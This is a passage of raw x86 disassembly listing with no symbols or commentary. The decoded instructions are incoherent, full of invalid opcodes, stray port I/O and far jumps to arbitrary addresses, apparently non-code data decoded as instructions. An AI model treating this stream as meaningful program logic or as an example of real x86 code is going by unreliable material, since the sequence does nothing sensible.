  434ad7:	6d                   	insl   (%dx),%es:(%edi)
  434ad8:	ef                   	out    %eax,(%dx)
  434ad9:	6e                   	outsb  %ds:(%esi),(%dx)
  434ada:	cc                   	int3
  434adb:	44                   	inc    %esp
  434adc:	0a 1e                	or     (%esi),%bl
  434ade:	2a 79 a9             	sub    -0x57(%ecx),%bh
  434ae1:	31 19                	xor    %ebx,(%ecx)
  434ae3:	c1 49 ed 64          	rorl   $0x64,-0x13(%ecx)
  434ae7:	75 df                	jne    0x434ac8
  434ae9:	cf                   	iret
  434aea:	94                   	xchg   %eax,%esp
  434aeb:	4f                   	dec    %edi
  434aec:	94                   	xchg   %eax,%esp
  434aed:	53                   	push   %ebx
  434aee:	cc                   	int3
  434aef:	58                   	pop    %eax
  434af0:	21 70 c0             	and    %esi,-0x40(%eax)
  434af3:	df 01                	filds  (%ecx)
  434af5:	e5 ce                	in     $0xce,%eax
  434af7:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  434af8:	23 17                	and    (%edi),%edx
  434afa:	73 a5                	jae    0x434aa1
  434afc:	da c4                	fcmovb %st(4),%st
  434afe:	b7 7f                	mov    $0x7f,%bh
  434b00:	b7 28                	mov    $0x28,%bh
  434b02:	be 34 ec 33 e7       	mov    $0xe733ec34,%esi
  434b07:	8d                   	lea    (bad),%esp
  434b08:	e6 0b                	out    %al,$0xb
  434b0a:	37                   	aaa
  434b0b:	cf                   	iret
  434b0c:	a0 69 6d bd 8e       	mov    0x8ebd6d69,%al
  434b11:	2c 8b                	sub    $0x8b,%al
  434b13:	34 52                	xor    $0x52,%al
  434b15:	43                   	inc    %ebx
  434b16:	0b 05 57 42 98 cc    	or     0xcc984257,%eax
  434b1c:	8a 6d 22             	mov    0x22(%ebp),%ch
  434b1f:	09 b2 bc 77 97 d8    	or     %esi,-0x27688844(%edx)
  434b25:	27                   	daa
  434b26:	6e                   	outsb  %ds:(%esi),(%dx)
  434b27:	d0 29                	shrb   $1,(%ecx)
  434b29:	d6                   	salc
  434b2a:	08 dd                	or     %bl,%ch
  434b2c:	30 38                	xor    %bh,(%eax)
  434b2e:	3b 7c e2 e7          	cmp    -0x19(%edx,%eiz,8),%edi
  434b32:	55                   	push   %ebp
  434b33:	0c 7d                	or     $0x7d,%al
  434b35:	4e                   	dec    %esi
  434b36:	27                   	daa
  434b37:	d5 a9                	aad    $0xa9
  434b39:	1f                   	pop    %ds
  434b3a:	c9                   	leave
  434b3b:	4a                   	dec    %edx
  434b3c:	3c 73                	cmp    $0x73,%al
  434b3e:	8b e9                	mov    %ecx,%ebp
  434b40:	97                   	xchg   %eax,%edi
  434b41:	5e                   	pop    %esi
  434b42:	71 1d                	jno    0x434b61
  434b44:	53                   	push   %ebx
  434b45:	86 55 48             	xchg   %dl,0x48(%ebp)
  434b48:	50                   	push   %eax
  434b49:	ee                   	out    %al,(%dx)
  434b4a:	33 09                	xor    (%ecx),%ecx
  434b4c:	0c 98                	or     $0x98,%al
  434b4e:	04 fd                	add    $0xfd,%al
  434b50:	25 80 04 60 46       	and    $0x46600480,%eax
  434b55:	0d fa d1 37 0b       	or     $0xb37d1fa,%eax
  434b5a:	04 5c                	add    $0x5c,%al
  434b5c:	56                   	push   %esi
  434b5d:	6b d4 a3             	imul   $0xffffffa3,%esp,%edx
  434b60:	88 75 84             	mov    %dh,-0x7c(%ebp)
  434b63:	fd                   	std
  434b64:	bf 31 2b dd 2d       	mov    $0x2ddd2b31,%edi
  434b69:	26 75 f8             	es jne 0x434b64
  434b6c:	61                   	popa
  434b6d:	73 b0                	jae    0x434b1f
  434b6f:	82 86 07 3c f3 ea 21 	addb   $0x21,-0x150cc3f9(%esi)
  434b76:	f9                   	stc
  434b77:	b0 68                	mov    $0x68,%al
  434b79:	3c b8                	cmp    $0xb8,%al
  434b7b:	26 8c 98 da 59 ea 88 	mov    %ds,%es:-0x7715a626(%eax)
  434b82:	71 a7                	jno    0x434b2b
  434b84:	73 f9                	jae    0x434b7f
  434b86:	00 8a d2 d8 d2 0b    	add    %cl,0xbd2d8d2(%edx)
  434b8c:	0f 15 b9 bd bb c2 7a 	unpckhps 0x7ac2bbbd(%ecx),%xmm7
  434b93:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434b94:	25 bc cf 98 bc       	and    $0xbc98cfbc,%eax
  434b99:	89 ad f3 ce a9 6d    	mov    %ebp,0x6da9cef3(%ebp)
  434b9f:	2a 25 fd ae 1e 8b    	sub    0x8b1eaefd,%ah
  434ba5:	37                   	aaa
  434ba6:	1b 50 4a             	sbb    0x4a(%eax),%edx
  434ba9:	44                   	inc    %esp
  434baa:	90                   	nop
  434bab:	90                   	nop
  434bac:	7c 90                	jl     0x434b3e
  434bae:	1d 5c 24 8f eb       	sbb    $0xeb8f245c,%eax
  434bb3:	78 69                	js     0x434c1e
  434bb5:	2a 13                	sub    (%ebx),%dl
  434bb7:	53                   	push   %ebx
  434bb8:	b3 c3                	mov    $0xc3,%bl
  434bba:	85 19                	test   %ebx,(%ecx)
  434bbc:	f1                   	int1
  434bbd:	df 98 ae 4d 9d 08    	fistps 0x89d4dae(%eax)
  434bc3:	5c                   	pop    %esp
  434bc4:	7d f1                	jge    0x434bb7
  434bc6:	4e                   	dec    %esi
  434bc7:	b9 a9 e9 ee 71       	mov    $0x71eee9a9,%ecx
  434bcc:	be 41 c0 35 db       	mov    $0xdb35c041,%esi
  434bd1:	7c ba                	jl     0x434b8d
  434bd3:	24 07                	and    $0x7,%al
  434bd5:	ee                   	out    %al,(%dx)
  434bd6:	e6 e5                	out    %al,$0xe5
  434bd8:	ae                   	scas   %es:(%edi),%al
  434bd9:	66 ac                	data16 lods %ds:(%esi),%al
  434bdb:	97                   	xchg   %eax,%edi
  434bdc:	27                   	daa
  434bdd:	54                   	push   %esp
  434bde:	f7 18                	negl   (%eax)
  434be0:	d2 5c 36 3a          	rcrb   %cl,0x3a(%esi,%esi,1)
  434be4:	55                   	push   %ebp
  434be5:	3a f7                	cmp    %bh,%dh
  434be7:	d4 4f                	aam    $0x4f
  434be9:	dc f4                	fdiv   %st,%st(4)
  434beb:	62                   	(bad)
  434bec:	f0 6d                	lock insl (%dx),%es:(%edi)
  434bee:	30 b3 af 8f bc d9    	xor    %dh,-0x26437051(%ebx)
  434bf4:	49                   	dec    %ecx
  434bf5:	ee                   	out    %al,(%dx)
  434bf6:	ef                   	out    %eax,(%dx)
  434bf7:	e3 47                	jecxz  0x434c40
  434bf9:	b1 2e                	mov    $0x2e,%cl
  434bfb:	a8 bf                	test   $0xbf,%al
  434bfd:	64 41                	fs inc %ecx
  434bff:	0b 15 6b 1b b3 55    	or     0x55b31b6b,%edx
  434c05:	07                   	pop    %es
  434c06:	55                   	push   %ebp
  434c07:	04 9d                	add    $0x9d,%al
  434c09:	b7 87                	mov    $0x87,%bh
  434c0b:	77 74                	ja     0x434c81
  434c0d:	b9 52 2b 2a 42       	mov    $0x422a2b52,%ecx
  434c12:	3b 83 ad 43 6b c8    	cmp    -0x3794bc53(%ebx),%eax
  434c18:	3b 43 f1             	cmp    -0xf(%ebx),%eax
  434c1b:	20 38                	and    %bh,(%eax)
  434c1d:	99                   	cltd
  434c1e:	f2 e8 b2 48 40 37    	bnd call 0x378394d6
  434c24:	ea 3a 54 b8 21 10 64 	ljmp   $0x6410,$0x21b8543a
  434c2b:	df d2                	(bad)
  434c2d:	4a                   	dec    %edx
  434c2e:	18 27                	sbb    %ah,(%edi)
  434c30:	7a 7f                	jp     0x434cb1
  434c32:	bb bc ea 09 f5       	mov    $0xf509eabc,%ebx
  434c37:	e6 7c                	out    %al,$0x7c
  434c39:	93                   	xchg   %eax,%ebx
  434c3a:	c0 70 47 c4          	shlb   $0xc4,0x47(%eax)
  434c3e:	eb 51                	jmp    0x434c91
  434c40:	18 4b 25             	sbb    %cl,0x25(%ebx)
  434c43:	af                   	scas   %es:(%edi),%eax
  434c44:	2e b6 96             	cs mov $0x96,%dh
  434c47:	b8 5e d8 82 81       	mov    $0x8182d85e,%eax
  434c4c:	fe                   	(bad)
  434c4d:	3f                   	aas
  434c4e:	ad                   	lods   %ds:(%esi),%eax
  434c4f:	86 0e                	xchg   %cl,(%esi)
  434c51:	76 c0                	jbe    0x434c13
  434c53:	a1 96 d0 bb ee       	mov    0xeebbd096,%eax
  434c58:	05 04 54 dc 0d       	add    $0xddc5404,%eax
  434c5d:	b1 3a                	mov    $0x3a,%cl
  434c5f:	f7 79 35             	idivl  0x35(%ecx)
  434c62:	17                   	pop    %ss
  434c63:	7d fc                	jge    0x434c61
  434c65:	b1 c2                	mov    $0xc2,%cl
  434c67:	49                   	dec    %ecx
  434c68:	cb                   	lret
  434c69:	af                   	scas   %es:(%edi),%eax
  434c6a:	08 a5 05 46 39 2f    	or     %ah,0x2f394605(%ebp)
  434c70:	5d                   	pop    %ebp
  434c71:	fa                   	cli
  434c72:	c1 7e 98 78          	sarl   $0x78,-0x68(%esi)
  434c76:	46                   	inc    %esi
  434c77:	cd bc                	int    $0xbc
  434c79:	1f                   	pop    %ds
  434c7a:	40                   	inc    %eax
  434c7b:	9f                   	lahf
  434c7c:	58                   	pop    %eax
  434c7d:	ea 98 91 a8 c9 c8 ef 	ljmp   $0xefc8,$0xc9a89198
  434c84:	81 e3 83 48 f2 90    	and    $0x90f24883,%ebx
  434c8a:	ad                   	lods   %ds:(%esi),%eax
  434c8b:	27                   	daa
  434c8c:	3d 2d 26 3c e6       	cmp    $0xe63c262d,%eax
  434c91:	54                   	push   %esp
  434c92:	b3 59                	mov    $0x59,%bl
  434c94:	e0 2a                	loopne 0x434cc0
  434c96:	72 6e                	jb     0x434d06
  434c98:	77 88                	ja     0x434c22
  434c9a:	51                   	push   %ecx
  434c9b:	17                   	pop    %ss
  434c9c:	d5 54                	aad    $0x54
  434c9e:	f6 d8                	neg    %al
  434ca0:	af                   	scas   %es:(%edi),%eax
  434ca1:	d1 c7                	rol    $1,%edi
  434ca3:	4f                   	dec    %edi
  434ca4:	cc                   	int3
  434ca5:	78 4f                	js     0x434cf6
  434ca7:	50                   	push   %eax
  434ca8:	3a d9                	cmp    %cl,%bl
  434caa:	39 44 f2 ef          	cmp    %eax,-0x11(%edx,%esi,8)
  434cae:	31 05 d0 13 1b 04    	xor    %eax,0x41b13d0
  434cb4:	f9                   	stc
  434cb5:	31 51 dc             	xor    %edx,-0x24(%ecx)
  434cb8:	ad                   	lods   %ds:(%esi),%eax
  434cb9:	51                   	push   %ecx
  434cba:	95                   	xchg   %eax,%ebp
  434cbb:	66 3a 11             	data16 cmp (%ecx),%dl
  434cbe:	e3 4c                	jecxz  0x434d0c
  434cc0:	1e                   	push   %ds
  434cc1:	87 e9                	xchg   %ebp,%ecx
  434cc3:	01 85 03 fd 26 4e    	add    %eax,0x4e26fd03(%ebp)
  434cc9:	17                   	pop    %ss
  434cca:	c5 09                	lds    (%ecx),%ecx
  434ccc:	fd                   	std
  434ccd:	2b 1f                	sub    (%edi),%ebx
  434ccf:	df 26                	fbld   (%esi)
  434cd1:	c6                   	(bad)
  434cd2:	cd a1                	int    $0xa1
  434cd4:	0b 01                	or     (%ecx),%eax
  434cd6:	7b 35                	jnp    0x434d0d
  434cd8:	f8                   	clc
  434cd9:	b4 05                	mov    $0x5,%ah
  434cdb:	62 e7 30             	(bad) {%k5}
  434cde:	4d                   	dec    %ebp
  434cdf:	67 d2 ed             	addr16 shr %cl,%ch
  434ce2:	ce                   	into
  434ce3:	ba 10 19 55 b3       	mov    $0xb3551910,%edx
  434ce8:	7c 58                	jl     0x434d42
  434cea:	98                   	cwtl
  434ceb:	e6 66                	out    %al,$0x66
  434ced:	89 9a 0b 34 57 f1    	mov    %ebx,-0xea8cbf5(%edx)
  434cf3:	90                   	nop
  434cf4:	c9                   	leave
  434cf5:	3d 69 5e 27 54       	cmp    $0x54275e69,%eax
  434cfa:	db 5d 98             	fistpl -0x68(%ebp)
  434cfd:	2d a3 61 58 17       	sub    $0x175861a3,%eax
  434d02:	10 ce                	adc    %cl,%dh
  434d04:	69 de 9b 87 d6 63    	imul   $0x63d6879b,%esi,%ebx
  434d0a:	de 7a de             	fidivrs -0x22(%edx)
  434d0d:	15 e6 3f 7c 92       	adc    $0x927c3fe6,%eax
  434d12:	3c 70                	cmp    $0x70,%al
  434d14:	03 1d 83 c1 15 7a    	add    0x7a15c183,%ebx
  434d1a:	7a 97                	jp     0x434cb3
  434d1c:	2a e9                	sub    %cl,%ch
  434d1e:	54                   	push   %esp
  434d1f:	f8                   	clc
  434d20:	d5 4e                	aad    $0x4e
  434d22:	93                   	xchg   %eax,%ebx
  434d23:	4c                   	dec    %esp
  434d24:	38 a7 f3 13 6a e7    	cmp    %ah,-0x1895ec0d(%edi)
  434d2a:	65 3d 66 d9 a6 0d    	gs cmp $0xda6d966,%eax
  434d30:	ea 6e a4 64 13 21 dc 	ljmp   $0xdc21,$0x1364a46e
  434d37:	2b 8c 70 0b cc 18 60 	sub    0x6018cc0b(%eax,%esi,2),%ecx
  434d3e:	b7 1c                	mov    $0x1c,%bh
  434d40:	33 3a                	xor    (%edx),%edi
  434d42:	d0 0e                	rorb   $1,(%esi)
  434d44:	64 8e 6b eb          	mov    %fs:-0x15(%ebx),%gs
  434d48:	5d                   	pop    %ebp
  434d49:	0d 9b 2e c4 2a       	or     $0x2ac42e9b,%eax
  434d4e:	1a 79 88             	sbb    -0x78(%ecx),%bh
  434d51:	5f                   	pop    %edi
  434d52:	6f                   	outsl  %ds:(%esi),(%dx)
  434d53:	73 b1                	jae    0x434d06
  434d55:	f7 62 2f             	mull   0x2f(%edx)
  434d58:	08 24 ec             	or     %ah,(%esp,%ebp,8)
  434d5b:	e5 d8                	in     $0xd8,%eax
  434d5d:	57                   	push   %edi
  434d5e:	ae                   	scas   %es:(%edi),%al
  434d5f:	91                   	xchg   %eax,%ecx
  434d60:	9a f5 b6 6d 2a 4e 02 	lcall  $0x24e,$0x2a6db6f5
  434d67:	f8                   	clc
  434d68:	3e 9f                	ds lahf
  434d6a:	f1                   	int1
  434d6b:	08 68 56             	or     %ch,0x56(%eax)
  434d6e:	7c 03                	jl     0x434d73
  434d70:	15 e7 29 1e 2e       	adc    $0x2e1e29e7,%eax
  434d75:	0a 21                	or     (%ecx),%ah
  434d77:	ac                   	lods   %ds:(%esi),%al
  434d78:	6c                   	insb   (%dx),%es:(%edi)
  434d79:	ad                   	lods   %ds:(%esi),%eax
  434d7a:	c2 83 6e             	ret    $0x6e83
  434d7d:	31 c7                	xor    %eax,%edi
  434d7f:	80 95 a7 82 d9 3e 6a 	adcb   $0x6a,0x3ed982a7(%ebp)
  434d86:	08 fd                	or     %bh,%ch
  434d88:	40                   	inc    %eax
  434d89:	53                   	push   %ebx
  434d8a:	e3 a3                	jecxz  0x434d2f
  434d8c:	88 e0                	mov    %ah,%al
  434d8e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434d8f:	4f                   	dec    %edi
  434d90:	06                   	push   %es
  434d91:	85 cb                	test   %ecx,%ebx
  434d93:	98                   	cwtl
  434d94:	73 92                	jae    0x434d28
  434d96:	a2 c0 ad 62 6a       	mov    %al,0x6a62adc0
  434d9b:	18 13                	sbb    %dl,(%ebx)
  434d9d:	82 a5 a1 45 b5 c3 ba 	andb   $0xba,-0x3c4aba5f(%ebp)
  434da4:	70 60                	jo     0x434e06
  434da6:	3e b0 01             	ds mov $0x1,%al
  434da9:	50                   	push   %eax
  434daa:	42                   	inc    %edx
  434dab:	1b 20                	sbb    (%eax),%esp
  434dad:	42                   	inc    %edx
  434dae:	1d 24 1b d5 15       	sbb    $0x15d51b24,%eax
  434db3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  434db4:	53                   	push   %ebx
  434db5:	ae                   	scas   %es:(%edi),%al
  434db6:	6d                   	insl   (%dx),%es:(%edi)
  434db7:	dc 54 be cb          	fcoml  -0x35(%esi,%edi,4)
  434dbb:	43                   	inc    %ebx
  434dbc:	e9 8e 78 37 b1       	jmp    0xb17ac64f
  434dc1:	fb                   	sti
  434dc2:	b6 83                	mov    $0x83,%dh
  434dc4:	91                   	xchg   %eax,%ecx
  434dc5:	b3 14                	mov    $0x14,%bl
  434dc7:	c6                   	(bad)
  434dc8:	36 5e                	ss pop %esi
  434dca:	34 4c                	xor    $0x4c,%al
  434dcc:	bf 8a 22 4c dd       	mov    $0xdd4c228a,%edi
  434dd1:	8b db                	mov    %ebx,%ebx
  434dd3:	02 26                	add    (%esi),%ah
  434dd5:	c1 af b5 55 07 7b d0 	shrl   $0xd0,0x7b0755b5(%edi)
  434ddc:	6e                   	outsb  %ds:(%esi),(%dx)
  434ddd:	93                   	xchg   %eax,%ebx
  434dde:	07                   	pop    %es
  434ddf:	54                   	push   %esp
  434de0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434de1:	fa                   	cli
  434de2:	18 21                	sbb    %ah,(%ecx)
  434de4:	2f                   	das
  434de5:	af                   	scas   %es:(%edi),%eax
  434de6:	00 24 24             	add    %ah,(%esp)
  434de9:	a9 94 4e 55 ff       	test   $0xff554e94,%eax
  434dee:	81 d8 c8 e1 99 f5    	sbb    $0xf599e1c8,%eax
  434df4:	72 62                	jb     0x434e58
  434df6:	63 a1 78 b4 20 14    	arpl   %esp,0x1420b478(%ecx)
  434dfc:	da 36                	fidivl (%esi)
  434dfe:	d2 f8                	sar    %cl,%al
  434e00:	e8 99 3b a1 5e       	call   0x5ee4899e
  434e05:	11 a6 ac ed 95 2f    	adc    %esp,0x2f95edac(%esi)
  434e0b:	79 58                	jns    0x434e65
  434e0d:	d4 6d                	aam    $0x6d
  434e0f:	8f                   	(bad)
  434e10:	db be 8d b5 30 32    	fstpt  0x3230b58d(%esi)
  434e16:	04 80                	add    $0x80,%al
  434e18:	15 14 3c 18 bc       	adc    $0xbc183c14,%eax
  434e1d:	02 b4 48 38 4b ce a1 	add    -0x5e31b4c8(%eax,%ecx,2),%dh
  434e24:	d6                   	salc
  434e25:	06                   	push   %es
  434e26:	46                   	inc    %esi
  434e27:	c2 dc ad             	ret    $0xaddc
  434e2a:	d2 c0                	rol    %cl,%al
  434e2c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434e2d:	b7 4a                	mov    $0x4a,%bh
  434e2f:	b8 12 73 4a a5       	mov    $0xa54a7312,%eax
  434e34:	7a 8b                	jp     0x434dc1
  434e36:	1b d6                	sbb    %esi,%edx
  434e38:	12 b0 52 41 2c c2    	adc    -0x3dd3beae(%eax),%dh
  434e3e:	5b                   	pop    %ebx
  434e3f:	6c                   	insb   (%dx),%es:(%edi)
  434e40:	69 13 d9 94 b4 6c    	imul   $0x6cb494d9,(%ebx),%edx
  434e46:	5b                   	pop    %ebx
  434e47:	d4 be                	aam    $0xbe
  434e49:	6d                   	insl   (%dx),%es:(%edi)
  434e4a:	23 5b aa             	and    -0x56(%ebx),%ebx
  434e4d:	da b4 22 6e a5 6f e1 	fidivl -0x1e905a92(%edx,%eiz,1)
  434e54:	ca d2 c1             	lret   $0xc1d2
  434e57:	6f                   	outsl  %ds:(%esi),(%dx)
  434e58:	06                   	push   %es
  434e59:	3e 9a 8f e8 d0 d0 01 	ds lcall $0x7301,$0xd0d0e88f
  434e60:	73 
  434e61:	cd b9                	int    $0xb9
  434e63:	37                   	aaa
  434e64:	c2 ab cf             	ret    $0xcfab
  434e67:	19 a7 8d fc a7 fc    	sbb    %esp,-0x3580373(%edi)
  434e6d:	e2 89                	loop   0x434df8
  434e6f:	ad                   	lods   %ds:(%esi),%eax
  434e70:	fb                   	sti
  434e71:	74 af                	je     0x434e22
  434e73:	8a 10                	mov    (%eax),%dl
  434e75:	3f                   	aas
  434e76:	d2 90 94 c9 07 9c    	rclb   %cl,-0x63f8366c(%eax)
  434e7c:	b6 14                	mov    $0x14,%dh
  434e7e:	bd 59 62 c1 6e       	mov    $0x6ec16259,%ebp
  434e83:	41                   	inc    %ecx
  434e84:	6a ae                	push   $0xffffffae
  434e86:	52                   	push   %edx
  434e87:	bb a9 8b ce 40       	mov    $0x40ce8ba9,%ebx
  434e8c:	ec                   	in     (%dx),%al
  434e8d:	51                   	push   %ecx
  434e8e:	d0 25 35 74 51 56    	shlb   $1,0x56517435
  434e94:	b7 8a                	mov    $0x8a,%bh
  434e96:	55                   	push   %ebp
  434e97:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434e98:	d4 ab                	aam    $0xab
  434e9a:	a1 88 6d fa 2a       	mov    0x2afa6d88,%eax
  434e9f:	db f6                	fcomi  %st(6),%st
  434ea1:	03 36                	add    (%esi),%esi
  434ea3:	83 3a 89             	cmpl   $0xffffff89,(%edx)
  434ea6:	e9 61 ad a1 e4       	jmp    0xe4e4fc0c
  434eab:	bc c8 9d b1 9b       	mov    $0x9bb19dc8,%esp
  434eb0:	88 56 05             	mov    %dl,0x5(%esi)
  434eb3:	af                   	scas   %es:(%edi),%eax
  434eb4:	81 7c 8b 30 09 6a da 	cmpl   $0xc6da6a09,0x30(%ebx,%ecx,4)
  434ebb:	c6 
  434ebc:	7b e1                	jnp    0x434e9f
  434ebe:	75 7b                	jne    0x434f3b
  434ec0:	d4 49                	aam    $0x49
  434ec2:	3a a4 c1 49 cb db f9 	cmp    -0x62434b7(%ecx,%eax,8),%ah
  434ec9:	02 c5                	add    %ch,%al
  434ecb:	88 1e                	mov    %bl,(%esi)
  434ecd:	16                   	push   %ss
  434ece:	63 7f 9a             	arpl   %edi,-0x66(%edi)
  434ed1:	6d                   	insl   (%dx),%es:(%edi)
  434ed2:	3b ed                	cmp    %ebp,%ebp
  434ed4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434ed5:	c7                   	(bad)
  434ed6:	2b b4 4a fd 63 8b c9 	sub    -0x36749c03(%edx,%ecx,2),%esi
  434edd:	1a 7c 51 3a          	sbb    0x3a(%ecx,%edx,2),%bh
  434ee1:	5b                   	pop    %ebx
  434ee2:	64 25 5a 2b d2 1a    	fs and $0x1ad22b5a,%eax
  434ee8:	4b                   	dec    %ebx
  434ee9:	ab                   	stos   %eax,%es:(%edi)
  434eea:	66 a4                	data16 movsb %ds:(%esi),%es:(%edi)
  434eec:	99                   	cltd
  434eed:	5c                   	pop    %esp
  434eee:	87 0e                	xchg   %ecx,(%esi)
  434ef0:	d7                   	xlat   %ds:(%ebx)
  434ef1:	66 f9                	data16 stc
  434ef3:	3d f0 22 d8 62       	cmp    $0x62d822f0,%eax
  434ef8:	0f 99 7f 10          	setns  0x10(%edi)
  434efc:	9c                   	pushf
  434efd:	18 48 9c             	sbb    %cl,-0x64(%eax)
  434f00:	09 c0                	or     %eax,%eax
  434f02:	11 e0                	adc    %esp,%eax
  434f04:	90                   	nop
  434f05:	44                   	inc    %esp
  434f06:	5e                   	pop    %esi
  434f07:	e6 73                	out    %al,$0x73
  434f09:	ae                   	scas   %es:(%edi),%al
  434f0a:	45                   	inc    %ebp
  434f0b:	a1 89 24 03 a7       	mov    0xa7032489,%eax
  434f10:	9f                   	lahf
  434f11:	82 c6 99             	add    $0x99,%dh
  434f14:	2f                   	das
  434f15:	d2 15 63 4c 8a 85    	rclb   %cl,0x858a4c63
  434f1b:	33 22                	xor    (%edx),%esp
  434f1d:	89 17                	mov    %edx,(%edi)
  434f1f:	be a7 c5 4c 04       	mov    $0x44cc5a7,%esi
  434f24:	bd 76 db 80 70       	mov    $0x7080db76,%ebp
  434f29:	b0 4e                	mov    $0x4e,%al
  434f2b:	16                   	push   %ss
  434f2c:	96                   	xchg   %eax,%esi
  434f2d:	d1 c9                	ror    $1,%ecx
  434f2f:	9c                   	pushf
  434f30:	74 f0                	je     0x434f22
  434f32:	78 6a                	js     0x434f9e
  434f34:	64 e8 c1 9f d1 93    	fs call 0x9414eefb
  434f3a:	89 3b                	mov    %edi,(%ebx)
  434f3c:	5e                   	pop    %esi
  434f3d:	26 84 85 a1 a5 1f ab 	test   %al,%es:-0x54e05a5f(%ebp)
  434f44:	c6                   	(bad)
  434f45:	29 92 f2 46 3f 14    	sub    %edx,0x143f46f2(%edx)
  434f4b:	b3 80                	mov    $0x80,%bl
  434f4d:	af                   	scas   %es:(%edi),%eax
  434f4e:	db 10                	fistl  (%eax)
  434f50:	e2 23                	loop   0x434f75
  434f52:	b3 9d                	mov    $0x9d,%bl
  434f54:	8d                   	lea    (bad),%esp
  434f55:	e5 71                	in     $0x71,%eax
  434f57:	de 61 dc             	fisubs -0x24(%ecx)
  434f5a:	f9                   	stc
  434f5b:	b9 e7 de 1a 01       	mov    $0x11adee7,%ecx
  434f60:	2a d8                	sub    %al,%bl
  434f62:	11 93 cf f0 29 0b    	adc    %edx,0xb29f0cf(%ebx)
  434f68:	80 14 51 fa          	adcb   $0xfa,(%ecx,%edx,2)
  434f6c:	28 0f                	sub    %cl,(%edi)
  434f6e:	99                   	cltd
  434f6f:	ed                   	in     (%dx),%eax
  434f70:	f7 11                	notl   (%ecx)
  434f72:	e5 f7                	in     $0xf7,%eax
  434f74:	69 d4 48 26 19 2d    	imul   $0x2d192648,%esp,%edx
  434f7a:	c3                   	ret
  434f7b:	d3 59 0a             	rcrl   %cl,0xa(%ecx)
  434f7e:	51                   	push   %ecx
  434f7f:	f3 3e 40             	repz ds inc %eax
  434f82:	8c a0 97 c8 44 4e    	mov    %fs,0x4e44c897(%eax)
  434f88:	2d c5 61 72 65       	sub    $0x657261c5,%eax
  434f8d:	3d ef a1 78 ca       	cmp    $0xca78a1ef,%eax
  434f92:	59                   	pop    %ecx
  434f93:	ed                   	in     (%dx),%eax
  434f94:	cb                   	lret
  434f95:	9a 1e 8b f4 93 41 4f 	lcall  $0x4f41,$0x93f48b1e
  434f9c:	e3 b3                	jecxz  0x434f51
  434f9e:	bb 2d a7 16 3f       	mov    $0x3f16a72d,%ebx
  434fa3:	b7 3a                	mov    $0x3a,%bh
  434fa5:	0b 95 ef 14 ca 1b    	or     0x1bca14ef(%ebp),%edx
  434fab:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434fac:	5c                   	pop    %esp
  434fad:	52                   	push   %edx
  434fae:	3f                   	aas
  434faf:	d5 3b                	aad    $0x3b
  434fb1:	a8 d2                	test   $0xd2,%al
  434fb3:	0b 4d 86             	or     -0x7a(%ebp),%ecx
  434fb6:	b5 9d                	mov    $0x9d,%ch
  434fb8:	1a fd                	sbb    %ch,%bh
  434fba:	c8 e6 06 ce          	enter  $0x6e6,$0xce
  434fbe:	07                   	pop    %es
  434fbf:	03 2b                	add    (%ebx),%ebp
  434fc1:	4f                   	dec    %edi
  434fc2:	dd 5a 8e             	fstpl  -0x72(%edx)
  434fc5:	1e                   	push   %ds
  434fc6:	e2 d5                	loop   0x434f9d
  434fc8:	00 fb                	add    %bh,%bl
  434fca:	fe c5                	inc    %ch
  434fcc:	df 6b e5             	fildll -0x1b(%ebx)
  434fcf:	11 30                	adc    %esi,(%eax)
  434fd1:	4d                   	dec    %ebp
  434fd2:	26 19 10             	sbb    %edx,%es:(%eax)
  434fd5:	cf                   	iret
  434fd6:	4d                   	dec    %ebp
  434fd7:	4b                   	dec    %ebx
  434fd8:	fd                   	std
  434fd9:	82 a5 e4 d5 8f e6 bf 	andb   $0xbf,-0x19702a1c(%ebp)
  434fe0:	49                   	dec    %ecx
  434fe1:	67 65 85 6f be       	test   %ebp,%gs:-0x42(%bx)
  434fe6:	20 5e 04             	and    %bl,0x4(%esi)
  434fe9:	1c e0                	sbb    $0xe0,%al
  434feb:	fe 86 34 40 c4 9d    	incb   -0x623bbfcc(%esi)
  434ff1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434ff2:	cc                   	int3
  434ff3:	09 fa                	or     %edi,%edx
  434ff5:	dd 59 69             	fstpl  0x69(%ecx)
  434ff8:	47                   	inc    %edi
  434ff9:	79 67                	jns    0x435062
  434ffb:	8c 25 0a a2 a7 da    	mov    %fs,0xdaa7a20a
  435001:	62                   	(bad)
  435002:	f4                   	hlt
  435003:	d3 a4 46 b2 92 e6 13 	shll   %cl,0x13e692b2(%esi,%eax,2)
  43500a:	f1                   	int1
  43500b:	22 56 c5             	and    -0x3b(%esi),%dl
  43500e:	05 9d 46 be c6       	add    $0xc6be469d,%eax
  435013:	a8 6a                	test   $0x6a,%al
  435015:	e4 16                	in     $0x16,%al
  435017:	41                   	inc    %ecx
  435018:	ea ba c2 41 bf 3c 13 	ljmp   $0x133c,$0xbf41c2ba
  43501f:	52                   	push   %edx
  435020:	82 f4 7f             	xor    $0x7f,%ah
  435023:	84 1e                	test   %bl,(%esi)
  435025:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435026:	42                   	inc    %edx
  435027:	53                   	push   %ebx
  435028:	ce                   	into
  435029:	9d                   	popf
  43502a:	2a 59 19             	sub    0x19(%ecx),%bl
  43502d:	89 10                	mov    %edx,(%eax)
  43502f:	0b 1c d7             	or     (%edi,%edx,8),%ebx
  435032:	1e                   	push   %ds
  435033:	04 69                	add    $0x69,%al
  435035:	4d                   	dec    %ebp
  435036:	1c 3d                	sbb    $0x3d,%al
  435038:	10 e6                	adc    %ah,%dh
  43503a:	5a                   	pop    %edx
  43503b:	2b 63 94             	sub    -0x6c(%ebx),%esp
  43503e:	44                   	inc    %esp
  43503f:	be f7 3b bc 0a       	mov    $0xabc3bf7,%esi
  435044:	aa                   	stos   %al,%es:(%edi)
  435045:	38 41 b7             	cmp    %al,-0x49(%ecx)
  435048:	8e c0                	mov    %eax,%es
  43504a:	ba a2 c4 6b 22       	mov    $0x226bc4a2,%edx
  43504f:	8a 64 ff 05          	mov    0x5(%edi,%edi,8),%ah
  435053:	d7                   	xlat   %ds:(%ebx)
  435054:	ad                   	lods   %ds:(%esi),%eax
